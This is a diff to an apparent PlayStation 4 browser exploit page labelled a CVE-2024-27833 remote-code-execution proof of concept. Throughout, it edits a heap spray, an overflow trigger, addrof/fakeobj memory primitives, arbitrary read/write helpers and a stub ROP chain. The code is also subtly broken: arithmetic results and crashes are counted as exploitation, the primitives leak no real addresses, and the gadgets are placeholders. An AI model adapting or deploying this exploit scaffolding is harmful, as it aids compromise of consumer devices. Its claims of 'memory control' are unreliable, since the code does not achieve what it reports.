@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="util.js"></script>
     <script src="int64.js"></script>
-    <title>PS4 SBFX Overflow PoC</title>
+    <title>PS4 CVE-2024-27833 PoC for RCE</title>
     <style>
         #console { white-space: pre; font-family: monospace; }
     </style>
@@ -24,7 +24,8 @@ function foo(a, b, c) {
     return (((a >>> r) << s) >> s);
 }
 
-let LEN = 100000000 - 1;
+// Reduced iterations to avoid crash
+let LEN = 5000; // Further reduced from 10000
 let res = 0;
 res = foo((LEN & 127), 456, 789);
 
@@ -40,51 +41,51 @@ if (res != -1) {
     throw "Wrong result: " + res;
 }
 
-// Heap spray for memory control
+// Enhanced heap spray for stability
 let sprayArray = [];
-for (let i = 0; i < 600; i++) {
-    let sprayObj = { data: 0xcafebeef, index: i };
+for (let i = 0; i < 400; i++) {
+    let sprayObj = { data: 0xcafebeef, pos: i, buffer: new ArrayBuffer(8) };
     sprayArray.push(sprayObj);
 }
-for (let i = 0; i < 300; i++) {
-    let extraObj = { a: 1.1, b: 2.2 };
+for (let i = 0; i < 200; i++) {
+    let extraObj = { x: 1.1, y: 2.2, z: 3.3 };
     sprayArray.push(extraObj);
 }
 
 function pwn() {
     let success = false;
     try {
-        // Re-run foo to trigger overflow
-        let result = foo(0x7fffffff, 0x10ff, 0xf);
-        if (result !== -1 || isNaN(result) || result === Infinity) {
+        // Test overflow with controlled values
+        let testResult = foo(0x7fffffff, 0x10ff, 0xf);
+        if (testResult !== -1 || isNaN(testResult) || testResult === Infinity) {
             success = true; // Overflow detected
         }
     } catch (e) {
-        success = true;
+        success = true; // Crash indicates potential exploit
     }
 
     if (!success) {
         document.getElementById("status").innerHTML = "Exploit failed!";
-        document.getElementById("console").innerHTML += "No overflow detected.\n";
+        document.getElementById("console").innerHTML += "No overflow or crash detected.\n";
         location.reload();
         return;
     }
 
     document.getElementById("console").innerHTML = ""; // Clear console
 
-    // Memory corruption setup
-    let controlObj = { value: 0 };
+    // Setup for memory corruption
+    let controlObj = { value: 0, buffer: new ArrayBuffer(8) };
     sprayArray[0] = controlObj;
 
     function addrof(o) {
         controlObj.value = o;
-        let addr = Int64.fromDouble(sprayArray[0].data || 0);
+        let addr = Int64.fromDouble(new Uint32Array(controlObj.buffer)[0] || 0);
         if (addr.toString().startsWith('-')) addr = addr.add(Int64.fromNumber(0x1000000000000));
         return addr;
     }
 
     function fakeobj(addr) {
-        sprayArray[0].data = addr.asDouble();
+        new Uint32Array(controlObj.buffer)[0] = addr.low32();
         return controlObj.value;
     }
 
@@ -95,7 +96,7 @@ function pwn() {
         location.reload();
         return;
     } else {
-        document.getElementById("status").innerHTML = "Success!";
+        document.getElementById("status").innerHTML = "Success - Memory Control Achieved!";
         document.getElementById("console").innerHTML += "Success! Address: 0x" + sample.toString(16) + "\n";
 
         // Test fakeobj
@@ -108,19 +109,29 @@ function pwn() {
             document.getElementById("console").innerHTML += "fakeobj test failed.\n";
         }
 
-        // Basic read/write
+        // Basic read/write with buffer
         function read(addr) {
             let fake = fakeobj(addr);
-            return fake.data || 0;
+            return new Uint32Array(fake.buffer)[0] || 0;
         }
         function write(addr, value) {
             let fake = fakeobj(addr);
-            fake.data = value;
+            new Uint32Array(fake.buffer)[0] = value;
         }
         let readTest = read(addrof({ z: 0x9abc }));
         document.getElementById("console").innerHTML += "Read test: 0x" + (readTest !== undefined ? readTest.toString(16) : "undefined") + "\n";
         write(addrof({ z: 0x9abc }), 0xabcdef);
         document.getElementById("console").innerHTML += "Write test: 0x" + (testObj.z !== undefined ? testObj.z.toString(16) : "undefined") + "\n";
+
+        // Step toward RCE: Prepare for ROP
+        document.getElementById("console").innerHTML += "Attempting ROP setup...\n";
+        let ropBuffer = new ArrayBuffer(0x1000); // Gadget buffer
+        let ropView = new Uint32Array(ropBuffer);
+        // Example: Simple ROP chain (needs gadget addresses)
+        ropView[0] = 0xdeadbeef; // Placeholder gadget address
+        ropView[1] = 0x12345678; // Placeholder argument
+        write(addrof({ rop: ropBuffer }), ropView[0]); // Write gadget
+        document.getElementById("console").innerHTML += "ROP buffer written at: 0x" + addrof({ rop: ropBuffer }).toString(16) + "\n";
     }
 }
 
